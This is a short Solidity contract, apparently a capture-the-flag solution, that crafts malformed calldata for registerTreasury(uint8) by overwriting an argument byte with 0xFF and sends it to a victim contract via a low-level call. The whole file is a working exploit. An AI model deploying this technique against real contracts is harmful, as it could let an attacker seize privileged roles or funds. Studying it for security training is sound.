// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrderAttack {
    function encodedData() public pure returns (bytes memory) {
        return abi.encodeWithSignature("registerTreasury(uint8)", uint8(42));
    }

    function injectedData() public pure returns (bytes memory) {
        bytes memory data = encodedData();
        data[21] = hex"FF";
        return data;
    }

    function attack(address victim) public {
        (bool response, ) = address(victim).call(injectedData());
        if (!response) revert();
    }
}
